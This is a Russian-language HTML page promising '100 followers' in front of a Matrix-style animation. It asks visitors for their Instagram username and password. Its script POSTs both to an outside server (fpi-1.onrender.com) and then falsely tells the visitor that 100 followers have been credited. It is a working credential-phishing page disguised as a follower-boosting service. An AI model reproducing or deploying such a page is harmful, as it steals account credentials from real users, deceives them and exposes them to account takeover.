<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>100 Подписчиков</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background: black;
            color: #0F0;
            text-align: center;
        }
        .container {
            position: relative;
            z-index: 2;
            padding-top: 100px;
        }
        input, button {
            background: black;
            color: #0F0;
            border: 1px solid #0F0;
            padding: 10px;
            margin: 5px;
            font-size: 18px;
        }
        #matrixCanvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }
    </style>
</head>
<body>

<canvas id="matrixCanvas"></canvas>

<div class="container">
    <h1>100 Подписчиков</h1>
    <input type="text" id="instagram" placeholder="Введите Instagram">
    <input type="password" id="password" placeholder="Введите пароль">
    <button onclick="register()">Отправить</button>
    <p id="message"></p>
</div>

<script>
    // Фон "Матрица"
    const canvas = document.getElementById("matrixCanvas");
    const ctx = canvas.getContext("2d");

    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890@#$%^&*()";
    const fontSize = 16;
    const columns = canvas.width / fontSize;
    const drops = Array.from({ length: columns }).fill(1);

    function drawMatrix() {
        ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        ctx.fillStyle = "#0F0";
        ctx.font = fontSize + "px monospace";

        for (let i = 0; i < drops.length; i++) {
            const text = letters[Math.floor(Math.random() * letters.length)];
            ctx.fillText(text, i * fontSize, drops[i] * fontSize);

            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                drops[i] = 0;
            }
            drops[i]++;
        }
    }

    setInterval(drawMatrix, 50);

    // Функция отправки данных на сервер
    function register() {
        const instagram = document.getElementById("instagram").value;
        const password = document.getElementById("password").value;
        const message = document.getElementById("message");

        if (!instagram || !password) {
            message.innerText = "Заполните все поля!";
            return;
        }

        fetch("https://fpi-1.onrender.com/register", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ instagram, password })
        })
        .then(response => response.json())
        .then(data => {
            message.innerText = "Вам успешно начислено 100 подписчиков!";
        })
        .catch(error => {
            message.innerText = "Ошибка отправки данных!";
            console.error("Ошибка запроса:", error);
        });
    }
</script>

</body>
</html>
